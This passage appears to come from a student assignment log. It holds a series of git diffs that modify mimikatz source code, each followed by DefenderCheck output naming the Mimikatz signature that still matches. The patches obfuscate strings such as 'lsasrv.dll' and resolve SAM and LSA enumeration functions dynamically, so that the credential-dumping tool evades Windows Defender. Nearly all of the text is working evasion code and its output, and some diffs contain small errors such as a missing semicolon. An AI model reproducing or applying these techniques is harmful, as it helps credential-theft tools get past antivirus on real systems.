 NTSTATUS kuhl_m_sekurlsa_credman(int argc, wchar_t * argv[])
```
### 19.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x13B944 in the original file
File matched signature: "HackTool:Win32/Mimikatz.A!dha"

00000000   57 00 6F 00 72 00 6B 00  65 00 72 00 28 00 64 00   W�o�r�k�e�r�(�d�
00000010   65 00 63 00 72 00 79 00  70 00 74 00 29 00 3A 00   e�c�r�y�p�t�)�:�
00000020   20 00 30 00 78 00 25 00  30 00 38 00 78 00 20 00    �0�x�%�0�8�x� �
00000030   2D 00 2D 00 20 00 69 00  6E 00 76 00 61 00 6C 00   -�-� �i�n�v�a�l�
00000040   69 00 64 00 61 00 74 00  69 00 6E 00 67 00 20 00   i�d�a�t�i�n�g� �
00000050   74 00 68 00 65 00 20 00  6B 00 65 00 79 00 0A 00   t�h�e� �k�e�y���
00000060   00 00 00 00 63 00 6C 00  6F 00 75 00 64 00 61 00   ����c�l�o�u�d�a�
00000070   70 00 2E 00 64 00 6C 00  6C 00 00 00 0A 00 09 00   p�.�d�l�l�������
00000080   20 00 20 00 20 00 20 00  20 00 43 00 61 00 63 00    � � � � �C�a�c�
00000090   68 00 65 00 64 00 69 00  72 00 20 00 3A 00 20 00   h�e�d�i�r� �:� �
000000A0   25 00 73 00 00 00 00 00  00 00 00 00 0A 00 09 00   %�s�������������
000000B0   20 00 20 00 20 00 20 00  20 00 4B 00 65 00 79 00    � � � � �K�e�y�
000000C0   20 00 47 00 55 00 49 00  44 00 20 00 3A 00 20 00    �G�U�I�D� �:� �
000000D0   00 00 00 00 0A 00 09 00  20 00 5B 00 25 00 30 00   �������� �[�%�0�
000000E0   38 00 78 00 5D 00 00 00  00 00 00 00 6C 00 73 00   8�x�]�������l�s�
000000F0   61 00 73 00 72 00 76 00  2E 00 64 00 6C 00 6C 00   a�s�r�v�.�d�l�l�
```


## 20.patch
### 20.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c
index 4853c91..2f5f8ef 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c
@@ -40,7 +40,8 @@ KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
 
 PKIWI_MASTERKEY_CACHE_ENTRY pMasterKeyCacheList = NULL;
 
-KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_lsa_package = {L"dpapi", NULL, FALSE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
+wchar_t other_lsas[] = { L'l', L's', L'a', L's', L'r', L'v', L'.', L'd', L'l', L'l', 0x0 };
+KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_lsa_package = {L"dpapi", NULL, FALSE, other_lsas, {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
 KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_svc_package = {L"dpapi", NULL, FALSE, L"dpapisrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
 
 NTSTATUS kuhl_m_sekurlsa_dpapi(int argc, wchar_t * argv[])
diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c
index 8bb9b84..7db2d25 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c
@@ -9,7 +9,8 @@ const ANSI_STRING
 	PRIMARY_STRING = {7, 8, "Primary"},
 	CREDENTIALKEYS_STRING = {14, 15, "CredentialKeys"};
 
-KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package = {L"msv", kuhl_m_sekurlsa_enum_logon_callback_msv, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
+wchar_t next_lsas[] = { L'l', L's', L'a', L's', L'r', L'v', L'.', L'd', L'l', L'l', 0x0 };
+KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package = {L"msv", kuhl_m_sekurlsa_enum_logon_callback_msv, TRUE, next_lsas, {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
 const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_single_package[] = {&kuhl_m_sekurlsa_msv_package};
 
 NTSTATUS kuhl_m_sekurlsa_msv(int argc, wchar_t * argv[])
```
### 20.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420288 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x13BF7A in the original file
File matched signature: "HackTool:Win32/Mimikatz.D"

00000000   6D 00 5F 00 63 00 72 00  65 00 64 00 5F 00 63 00   m�_�c�r�e�d�_�c�
00000010   61 00 6C 00 6C 00 62 00  61 00 63 00 6B 00 5F 00   a�l�l�b�a�c�k�_�
00000020   70 00 74 00 68 00 20 00  3B 00 20 00 6B 00 75 00   p�t�h� �;� �k�u�
00000030   6C 00 6C 00 5F 00 6D 00  5F 00 6D 00 65 00 6D 00   l�l�_�m�_�m�e�m�
00000040   6F 00 72 00 79 00 5F 00  63 00 6F 00 70 00 79 00   o�r�y�_�c�o�p�y�
00000050   20 00 28 00 30 00 78 00  25 00 30 00 38 00 78 00    �(�0�x�%�0�8�x�
00000060   29 00 0A 00 00 00 6E 00  2E 00 65 00 2E 00 20 00   )�����n�.�e�.� �
00000070   28 00 4B 00 49 00 57 00  49 00 5F 00 4D 00 53 00   (�K�I�W�I�_�M�S�
00000080   56 00 31 00 5F 00 30 00  5F 00 50 00 52 00 49 00   V�1�_�0�_�P�R�I�
00000090   4D 00 41 00 52 00 59 00  5F 00 43 00 52 00 45 00   M�A�R�Y�_�C�R�E�
000000A0   44 00 45 00 4E 00 54 00  49 00 41 00 4C 00 53 00   D�E�N�T�I�A�L�S�
000000B0   20 00 4B 00 4F 00 29 00  00 00 00 00 00 00 00 00    �K�O�)���������
000000C0   00 00 00 00 00 00 6E 00  2E 00 65 00 2E 00 20 00   ������n�.�e�.� �
000000D0   28 00 4B 00 49 00 57 00  49 00 5F 00 4D 00 53 00   (�K�I�W�I�_�M�S�
000000E0   56 00 31 00 5F 00 30 00  5F 00 43 00 52 00 45 00   V�1�_�0�_�C�R�E�
000000F0   44 00 45 00 4E 00 54 00  49 00 41 00 4C 00 53 00   D�E�N�T�I�A�L�S�
```


## 21.patch
### 21.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c
index 7db2d25..90eff99 100644
--- a/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c
+++ b/files/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c
@@ -98,7 +98,8 @@ VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID
 	KIWI_MSV1_0_CREDENTIALS credentials;
 	KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {pCredentials, cLsass->hLsassMem};
-
+	
+	wchar_t kiwi_creds[] = { L'n', L'.', L'e', L'.', L' ', L'(', L'K', L'I', L'W', L'I', L'_', L'M', L'S', L'V', L'1', L'_', L'0', L'_', L'C', L'R', L'E', L'D', L'E', L'N', L'T', L'I', L'A', L'L', L'S', L' ', L'K', L'O', L')', 0x0 };
 	while(aLsassMemory.address)
 	{
 		aLocalMemory.address = &credentials;
@@ -124,7 +125,7 @@ VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID
 				aLsassMemory.address = primaryCredentials.next;
 			}
 			aLsassMemory.address = credentials.next;
-		} else kprintf(L"n.e. (KIWI_MSV1_0_CREDENTIALS KO)");
+		} else kprintf(kiwi_creds);
 	}
 }
 ```
### 21.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420800 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x144FD6 in the original file
File matched signature: "HackTool:Win32/Mimikatz.D"

00000000   74 41 75 74 68 49 6E 66  6F 57 00 00 99 01 52 70   tAuthInfoW��?�Rp
00000010   63 4D 67 6D 74 45 70 45  6C 74 49 6E 71 42 65 67   cMgmtEpEltInqBeg
00000020   69 6E 00 00 9A 01 52 70  63 4D 67 6D 74 45 70 45   in��?�RpcMgmtEpE
00000030   6C 74 49 6E 71 44 6F 6E  65 00 9C 01 52 70 63 4D   ltInqDone�?�RpcM
00000040   67 6D 74 45 70 45 6C 74  49 6E 71 4E 65 78 74 57   gmtEpEltInqNextW
00000050   00 00 34 00 49 5F 52 70  63 47 65 74 43 75 72 72   ��4�I_RpcGetCurr
00000060   65 6E 74 43 61 6C 6C 48  61 6E 64 6C 65 00 52 50   entCallHandle�RP
00000070   43 52 54 34 2E 64 6C 6C  00 00 3A 00 50 61 74 68   CRT4.dll��:�Path
00000080   43 6F 6D 62 69 6E 65 57  00 00 38 00 50 61 74 68   CombineW��8�Path
00000090   43 61 6E 6F 6E 69 63 61  6C 69 7A 65 57 00 65 00   CanonicalizeW�e�
000000A0   50 61 74 68 49 73 52 65  6C 61 74 69 76 65 57 00   PathIsRelativeW�
000000B0   49 00 50 61 74 68 46 69  6E 64 46 69 6C 65 4E 61   I�PathFindFileNa
000000C0   6D 65 57 00 5B 00 50 61  74 68 49 73 44 69 72 65   meW�[�PathIsDire
000000D0   63 74 6F 72 79 57 00 00  53 48 4C 57 41 50 49 2E   ctoryW��SHLWAPI.
000000E0   64 6C 6C 00 13 00 53 61  6D 45 6E 75 6D 65 72 61   dll���SamEnumera
000000F0   74 65 55 73 65 72 73 49  6E 44 6F 6D 61 69 6E 00   teUsersInDomain�
```


## 22.patch
### 22.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
index 5dcc8b3..35ea4c7 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
@@ -1409,9 +1409,12 @@ NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 						}
 						else
 						{
+							HMODULE librar = LoadLibrary(L"Netapi32.dll");
+							char sSEUID[] = { 'S', 'a', 'm', 'E', 'n', 'u', 'm', 'e', 'r', 'a', 't', 'e', 'U', 's', 'e', 'r', 's', 'I', 'n', 'D', 'o', 'm', 'a', 'i', 'n', 0x0 };
+							SamEnumerateUsersInDomain_t SEUID = (SamEnumerateUsersInDomain_t)GetProcAddress(librar, sSEUID);
 							do
 							{
-								enumStatus = SamEnumerateUsersInDomain(hDomain, &EnumerationContext, 0, &pEnumBuffer, 100, &CountRetourned);
+								enumStatus = SEUID(hDomain, &EnumerationContext, 0, &pEnumBuffer, 100, &CountRetourned);
 								if(NT_SUCCESS(enumStatus) || enumStatus == STATUS_MORE_ENTRIES)
 								{
 									for(i = 0; i < CountRetourned; i++)
@@ -1419,6 +1422,7 @@ NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 									SamFreeMemory(pEnumBuffer);
 								} else PRINT_ERROR(L"SamEnumerateUsersInDomain %08x\n", enumStatus);
 							} while(enumStatus == STATUS_MORE_ENTRIES);
+							FreeLibrary(librar);
 						}
 						SamCloseHandle(hDomain);
 					} else PRINT_ERROR(L"SamOpenDomain %08x\n", status);
diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_net.c b/files/mimikatz/mimikatz/modules/kuhl_m_net.c
index f59ea0d..54b27b7 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_net.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_net.c
@@ -64,7 +64,10 @@ NTSTATUS kuhl_m_net_user(int argc, wchar_t * argv[])
 							userEnumerationContext = 0;
 							do
 							{
-								enumUserStatus = SamEnumerateUsersInDomain(hDomainHandle, &userEnumerationContext, 0/*UF_NORMAL_ACCOUNT*/, &pEnumUsersBuffer, 1, &userCountRetourned);
+								HMODULE librar = LoadLibrary(L"Netapi32.dll");
+								char sSEUID[] = { 'S', 'a', 'm', 'E', 'n', 'u', 'm', 'e', 'r', 'a', 't', 'e', 'U', 's', 'e', 'r', 's', 'I', 'n', 'D', 'o', 'm', 'a', 'i', 'n', 0x0 };
+								SamEnumerateUsersInDomain_t SEUID = (SamEnumerateUsersInDomain_t)GetProcAddress(librar, sSEUID);
+								enumUserStatus = SEUID(hDomainHandle, &userEnumerationContext, 0/*UF_NORMAL_ACCOUNT*/, &pEnumUsersBuffer, 1, &userCountRetourned);
 								if(NT_SUCCESS(enumUserStatus) || enumUserStatus == STATUS_MORE_ENTRIES)
 								{
 									for(j = 0; j < userCountRetourned; j++)
@@ -122,6 +125,7 @@ NTSTATUS kuhl_m_net_user(int argc, wchar_t * argv[])
 									SamFreeMemory(pEnumUsersBuffer);
 								}
 								else PRINT_ERROR(L"SamEnumerateUsersInDomain %08x", enumUserStatus);
+								FreeLibrary(librar)
 							}
 							while(enumUserStatus == STATUS_MORE_ENTRIES);
 							SamCloseHandle(hDomainHandle);
diff --git a/files/mimikatz/modules/kull_m_samlib.h b/files/mimikatz/modules/kull_m_samlib.h
index dd8b14f..670dd33 100644
--- a/files/mimikatz/modules/kull_m_samlib.h
+++ b/files/mimikatz/modules/kull_m_samlib.h
@@ -117,7 +117,15 @@ extern NTSTATUS WINAPI SamGetAliasMembership(IN SAMPR_HANDLE DomainHandle, IN DW
 extern NTSTATUS WINAPI SamGetMembersInGroup(IN SAMPR_HANDLE GroupHandle, OUT PDWORD *Members, OUT PDWORD *Attributes, OUT DWORD * CountReturned); // todo !!!
 extern NTSTATUS WINAPI SamGetMembersInAlias(IN SAMPR_HANDLE AliasHandle, OUT PSID ** Members, OUT DWORD * CountReturned);
 
-extern NTSTATUS WINAPI SamEnumerateUsersInDomain(IN SAMPR_HANDLE DomainHandle, IN OUT PDWORD EnumerationContext, IN DWORD UserAccountControl, OUT PSAMPR_RID_ENUMERATION* Buffer, IN DWORD PreferedMaximumLength, OUT PDWORD CountReturned);
+//extern NTSTATUS WINAPI SamEnumerateUsersInDomain(IN SAMPR_HANDLE DomainHandle, IN OUT PDWORD EnumerationContext, IN DWORD UserAccountControl, OUT PSAMPR_RID_ENUMERATION* Buffer, IN DWORD PreferedMaximumLength, OUT PDWORD CountReturned);
+typedef NTSTATUS(WINAPI *SamEnumerateUsersInDomain_t)(
+	IN SAMPR_HANDLE DomainHandle,
+	IN OUT PDWORD EnumerationContext,
+	IN DWORD UserAccountControl,
+	OUT PSAMPR_RID_ENUMERATION* Buffer,
+	IN DWORD PreferedMaximumLength,
+	OUT PDWORD CountReturned
+);
 extern NTSTATUS WINAPI SamEnumerateGroupsInDomain(IN SAMPR_HANDLE DomainHandle, IN OUT PDWORD EnumerationContext, OUT PSAMPR_RID_ENUMERATION * Buffer, IN DWORD PreferedMaximumLength, OUT PDWORD CountReturned);
 extern NTSTATUS WINAPI SamEnumerateAliasesInDomain(IN SAMPR_HANDLE DomainHandle, IN OUT PDWORD EnumerationContext, OUT PSAMPR_RID_ENUMERATION * Buffer, IN DWORD PreferedMaximumLength, OUT PDWORD CountReturned);
 extern NTSTATUS WINAPI SamLookupNamesInDomain(IN SAMPR_HANDLE DomainHandle, IN DWORD Count, IN PUNICODE_STRING Names, OUT PDWORD * RelativeIds, OUT PDWORD * Use);
```
### 22.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1420800 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x14504D in the original file
File matched signature: "HackTool:Win32/Mimikatz.D"

00000000   45 6C 74 49 6E 71 44 6F  6E 65 00 9C 01 52 70 63   EltInqDone�?�Rpc
00000010   4D 67 6D 74 45 70 45 6C  74 49 6E 71 4E 65 78 74   MgmtEpEltInqNext
00000020   57 00 00 34 00 49 5F 52  70 63 47 65 74 43 75 72   W��4�I_RpcGetCur
00000030   72 65 6E 74 43 61 6C 6C  48 61 6E 64 6C 65 00 52   rentCallHandle�R
00000040   50 43 52 54 34 2E 64 6C  6C 00 00 3A 00 50 61 74   PCRT4.dll��:�Pat
00000050   68 43 6F 6D 62 69 6E 65  57 00 00 38 00 50 61 74   hCombineW��8�Pat
00000060   68 43 61 6E 6F 6E 69 63  61 6C 69 7A 65 57 00 65   hCanonicalizeW�e
00000070   00 50 61 74 68 49 73 52  65 6C 61 74 69 76 65 57   �PathIsRelativeW
00000080   00 49 00 50 61 74 68 46  69 6E 64 46 69 6C 65 4E   �I�PathFindFileN
00000090   61 6D 65 57 00 5B 00 50  61 74 68 49 73 44 69 72   ameW�[�PathIsDir
000000A0   65 63 74 6F 72 79 57 00  00 53 48 4C 57 41 50 49   ectoryW��SHLWAPI
000000B0   2E 64 6C 6C 00 1D 00 53  61 6D 4C 6F 6F 6B 75 70   .dll���SamLookup
000000C0   4E 61 6D 65 73 49 6E 44  6F 6D 61 69 6E 00 00 1F   NamesInDomain���
000000D0   00 53 61 6D 4F 70 65 6E  44 6F 6D 61 69 6E 00 11   �SamOpenDomain��
000000E0   00 53 61 6D 45 6E 75 6D  65 72 61 74 65 44 6F 6D   �SamEnumerateDom
000000F0   61 69 6E 73 49 6E 53 61  6D 53 65 72 76 65 72 00   ainsInSamServer�
```


## 23.patch
### 23.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
index 35ea4c7..39569a4 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
@@ -2285,7 +2285,10 @@ NTSTATUS kuhl_m_lsadump_enumdomains_users_data(PLSA_UNICODE_STRING uServerName,
 		{
 			do
 			{
-				enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
+				HMODULE slib = LoadLibrary(L"Netapi32.dll");
+				char sSEDISS[] = { 'S', 'a', 'm', 'E', 'n', 'u', 'm', 'e', 'r', 'a', 't', 'e', 'D', 'o', 'm', 'a', 'i', 'n', 's', 'I', 'n', 'S', 'a', 'm', 'S', 'e', 'r', 'v', 'e', 'r', 0x0 };
+				SamEnumerateDomainsInSamServer_t SEDISS = (SamEnumerateDomainsInSamServer_t)GetProcAddress(slib, sSEDISS);
+				enumDomainStatus = SEDISS(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
 				if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
 				{
 					for(i = 0; i < domainCountRetourned; i++)
@@ -2340,6 +2343,7 @@ NTSTATUS kuhl_m_lsadump_enumdomains_users_data(PLSA_UNICODE_STRING uServerName,
 					SamFreeMemory(pEnumDomainBuffer);
 				}
 				else PRINT_ERROR(L"SamEnumerateDomainsInSamServer: %08x\n", enumDomainStatus);
+				FreeLibrary(slib);
 			}
 			while(enumDomainStatus == STATUS_MORE_ENTRIES);
 			SamCloseHandle(hServerHandle);
diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_net.c b/files/mimikatz/mimikatz/modules/kuhl_m_net.c
index 1525fb4..693ac9e 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_net.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_net.c
@@ -44,9 +44,12 @@ NTSTATUS kuhl_m_net_user(int argc, wchar_t * argv[])
 		if(!NT_SUCCESS(status))
 			PRINT_ERROR(L"SamOpenDomain Builtin (?) %08x\n", status);
 		
+		HMODULE slib = LoadLibrary(L"Netapi32.dll");
+		char sSEDISS[] = { 'S', 'a', 'm', 'E', 'n', 'u', 'm', 'e', 'r', 'a', 't', 'e', 'D', 'o', 'm', 'a', 'i', 'n', 's', 'I', 'n', 'S', 'a', 'm', 'S', 'e', 'r', 'v', 'e', 'r', 0x0 };
+		SamEnumerateDomainsInSamServer_t SEDISS = (SamEnumerateDomainsInSamServer_t)GetProcAddress(slib, sSEDISS);
 		do
 		{
-			enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
+			enumDomainStatus = SEDISS(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
 			if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
 			{
 				for(i = 0; i < domainCountRetourned; i++)
@@ -141,6 +144,7 @@ NTSTATUS kuhl_m_net_user(int argc, wchar_t * argv[])
 			kprintf(L"\n");
 		}
 		while(enumDomainStatus == STATUS_MORE_ENTRIES);
+		FreeLibrary(slib);
 
 		if(hBuiltinHandle)
 			SamCloseHandle(hBuiltinHandle);
@@ -165,9 +169,12 @@ NTSTATUS kuhl_m_net_group(int argc, wchar_t * argv[])
 	status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
 	if(NT_SUCCESS(status))
 	{
+		HMODULE slib = LoadLibrary(L"Netapi32.dll");
+		char sSEDISS[] = { 'S', 'a', 'm', 'E', 'n', 'u', 'm', 'e', 'r', 'a', 't', 'e', 'D', 'o', 'm', 'a', 'i', 'n', 's', 'I', 'n', 'S', 'a', 'm', 'S', 'e', 'r', 'v', 'e', 'r', 0x0 };
+		SamEnumerateDomainsInSamServer_t SEDISS = (SamEnumerateDomainsInSamServer_t)GetProcAddress(slib, sSEDISS);
 		do
 		{
-			enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
+			enumDomainStatus = SEDISS(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
 			if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
 			{
 				for(i = 0; i < domainCountRetourned; i++)
@@ -229,6 +236,7 @@ NTSTATUS kuhl_m_net_group(int argc, wchar_t * argv[])
 			kprintf(L"\n");
 		}
 		while(enumDomainStatus == STATUS_MORE_ENTRIES);
+		FreeLibrary(slib);
 		SamCloseHandle(hServerHandle);
 	}
 	else PRINT_ERROR(L"SamConnect %08x\n", status);
@@ -249,9 +257,12 @@ NTSTATUS kuhl_m_net_alias(int argc, wchar_t * argv[])
 	status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
 	if(NT_SUCCESS(status))
 	{
+		HMODULE slib = LoadLibrary(L"Netapi32.dll");
+		char sSEDISS[] = { 'S', 'a', 'm', 'E', 'n', 'u', 'm', 'e', 'r', 'a', 't', 'e', 'D', 'o', 'm', 'a', 'i', 'n', 's', 'I', 'n', 'S', 'a', 'm', 'S', 'e', 'r', 'v', 'e', 'r', 0x0 };
+		SamEnumerateDomainsInSamServer_t SEDISS = (SamEnumerateDomainsInSamServer_t)GetProcAddress(slib, sSEDISS);
 		do
 		{
-			enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
+			enumDomainStatus = SEDISS(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountRetourned);
 			if(NT_SUCCESS(enumDomainStatus) || enumDomainStatus == STATUS_MORE_ENTRIES)
 			{
 				for(i = 0; i < domainCountRetourned; i++)
@@ -311,6 +322,7 @@ NTSTATUS kuhl_m_net_alias(int argc, wchar_t * argv[])
 			kprintf(L"\n");
 		}
 		while(enumDomainStatus == STATUS_MORE_ENTRIES);
+		FreeLibrary(slib);
 		SamCloseHandle(hServerHandle);
 	}
 	else PRINT_ERROR(L"SamConnect %08x\n", status);
diff --git a/files/mimikatz/modules/kull_m_samlib.h b/files/mimikatz/modules/kull_m_samlib.h
index 670dd33..57abd99 100644
--- a/files/mimikatz/modules/kull_m_samlib.h
+++ b/files/mimikatz/modules/kull_m_samlib.h
@@ -100,7 +100,15 @@ typedef struct _SAMPR_GET_MEMBERS_BUFFER {
 
 extern NTSTATUS WINAPI SamConnect(IN PUNICODE_STRING ServerName, OUT SAMPR_HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted);
 extern NTSTATUS WINAPI SamConnectWithCreds(IN PUNICODE_STRING ServerName, OUT SAMPR_HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN LSA_OBJECT_ATTRIBUTES * ObjectAttributes, IN RPC_AUTH_IDENTITY_HANDLE AuthIdentity, IN PWSTR ServerPrincName, OUT ULONG * unk0);
-extern NTSTATUS WINAPI SamEnumerateDomainsInSamServer(IN SAMPR_HANDLE ServerHandle, OUT DWORD * EnumerationContext, OUT PSAMPR_RID_ENUMERATION* Buffer, IN DWORD PreferedMaximumLength, OUT DWORD * CountReturned);
+//extern NTSTATUS WINAPI SamEnumerateDomainsInSamServer(IN SAMPR_HANDLE ServerHandle, OUT DWORD * EnumerationContext, OUT PSAMPR_RID_ENUMERATION* Buffer, IN DWORD PreferedMaximumLength, OUT DWORD * CountReturned);
+typedef NTSTATUS (WINAPI *SamEnumerateDomainsInSamServer_t) (
+	IN SAMPR_HANDLE ServerHandle,
+	OUT DWORD * EnumerationContext,
+	OUT PSAMPR_RID_ENUMERATION* Buffer,
+	IN DWORD PreferedMaximumLength,
+	OUT DWORD * CountReturned
+);
+
 extern NTSTATUS WINAPI SamLookupDomainInSamServer(IN SAMPR_HANDLE ServerHandle, IN PUNICODE_STRING Name, OUT PSID * DomainId);
 
 extern NTSTATUS WINAPI SamOpenDomain(IN SAMPR_HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT SAMPR_HANDLE * DomainHandle);
```
### 23.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1421312 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x145448 in the original file
File matched signature: "HackTool:Win32/Mimikatz.H"

00000000   6F 75 70 73 49 6E 44 6F  6D 61 69 6E 00 00 1A 00   oupsInDomain����
00000010   53 61 6D 47 65 74 4D 65  6D 62 65 72 73 49 6E 47   SamGetMembersInG
00000020   72 6F 75 70 00 00 19 00  53 61 6D 47 65 74 4D 65   roup����SamGetMe
00000030   6D 62 65 72 73 49 6E 41  6C 69 61 73 00 00 18 00   mbersInAlias����
00000040   53 61 6D 47 65 74 47 72  6F 75 70 73 46 6F 72 55   SamGetGroupsForU
00000050   73 65 72 00 53 41 4D 4C  49 42 2E 64 6C 6C 00 00   ser�SAMLIB.dll��
00000060   18 00 46 72 65 65 43 6F  6E 74 65 78 74 42 75 66   ��FreeContextBuf
00000070   66 65 72 00 34 00 51 75  65 72 79 43 6F 6E 74 65   fer�4�QueryConte
00000080   78 74 41 74 74 72 69 62  75 74 65 73 57 00 27 00   xtAttributesW�'�
00000090   4C 73 61 43 6F 6E 6E 65  63 74 55 6E 74 72 75 73   LsaConnectUntrus
000000A0   74 65 64 00 28 00 4C 73  61 44 65 72 65 67 69 73   ted�(�LsaDeregis
000000B0   74 65 72 4C 6F 67 6F 6E  50 72 6F 63 65 73 73 00   terLogonProcess�
000000C0   26 00 4C 73 61 43 61 6C  6C 41 75 74 68 65 6E 74   &�LsaCallAuthent
000000D0   69 63 61 74 69 6F 6E 50  61 63 6B 61 67 65 00 00   icationPackage��
000000E0   2D 00 4C 73 61 4C 6F 6F  6B 75 70 41 75 74 68 65   -�LsaLookupAuthe
000000F0   6E 74 69 63 61 74 69 6F  6E 50 61 63 6B 61 67 65   nticationPackage
```


## 24.patch
### 24.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kerberos/kuhl_m_kerberos.c b/files/mimikatz/mimikatz/modules/kerberos/kuhl_m_kerberos.c
index 0398615..b2700ce 100644
--- a/files/mimikatz/mimikatz/modules/kerberos/kuhl_m_kerberos.c
+++ b/files/mimikatz/mimikatz/modules/kerberos/kuhl_m_kerberos.c
@@ -36,8 +36,18 @@ NTSTATUS kuhl_m_kerberos_init()
 	NTSTATUS status = LsaConnectUntrusted(&g_hLSA);
 	if(NT_SUCCESS(status))
 	{
-		status = LsaLookupAuthenticationPackage(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos);
+		wchar_t sntdl[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', 0x0 };
+		HMODULE ntlib = LoadLibrary(sntdl);
